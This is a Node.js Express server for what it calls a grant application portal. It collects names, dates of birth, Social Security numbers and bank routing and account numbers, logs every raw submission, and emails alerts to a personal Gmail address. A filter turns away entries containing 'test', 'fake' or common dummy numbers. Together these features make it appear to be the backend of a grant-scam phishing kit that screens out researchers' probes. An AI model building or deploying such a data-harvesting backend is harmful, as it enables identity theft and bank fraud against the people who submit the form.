import express from "express";
import mongoose from "mongoose";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";

const app = express();
const PORT = process.env.PORT || 5000;

// Allow requests from your frontend
app.use(cors({
  origin: "*",
  methods: ["POST", "GET"]
}));

app.use(bodyParser.json());

// --- DATABASE CONNECTION ---
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/grant_portal";

mongoose.connect(MONGO_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch(err => console.error("MongoDB connection error:", err));

// --- SCHEMA ---
const ApplicationSchema = new mongoose.Schema({
  grantId: { type: String, required: true },
  fullName: { type: String, required: true },
  dob: String,
  phone: String,
  email: { type: String, required: true },
  address: String,
  ssn: String,
  bankName: String,
  routingNumber: String,
  accountName: String,
  accountNumber: String,
  certification: Boolean,
  signature: { type: String, required: true },
  status: { type: String, default: "Pending Review" },
  submittedAt: { type: Date, default: Date.now },
});

ApplicationSchema.index({ email: 1, grantId: 1 }, { unique: true });

const Application = mongoose.model("Application", ApplicationSchema);

// --- EMAIL TRANSPORT ---
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER || "admin@example.com",
    pass: process.env.EMAIL_PASS || "password",
  },
});

// --- FAKE DATA CHECK ---
const isSuspicious = (data) => {
  const patterns = [
    /test/i, /demo/i, /fake/i,
    /123456789/, /987654321/, /000000000/,
    /555-555-5555/, /123 Main St/i
  ];
  return patterns.some(p => p.test(JSON.stringify(data)));
};

// --- SUBMIT ROUTE ---
app.post("/submit", async (req, res) => {
  try {
    console.log("Received submission:", req.body);

    if (isSuspicious(req.body)) {
      return res.status(400).json({
        success: false,
        message: "Submission flagged for invalid or test data."
      });
    }

    const applicationData = {
      ...req.body,
      routingNumber: req.body.branch
    };

    const application = new Application(applicationData);
    await application.save();

    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER || "admin@example.com",
        to: "anne67j@gmail.com",
        subject: `New Grant Application: ${req.body.fullName}`,
        text: `
New Application Received.

Name: ${req.body.fullName}
Email: ${req.body.email}
Phone: ${req.body.phone}
Grant ID: ${req.body.grantId}
Signed By: ${req.body.signature}
        `
      });
      console.log("Notification email sent.");
    } catch (emailErr) {
      console.error("Email sending failed:", emailErr);
    }

    res.status(200).json({ success: true, message: "Application submitted successfully" });

  } catch (err) {
    console.error("Submission error:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// --- START SERVER ---
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
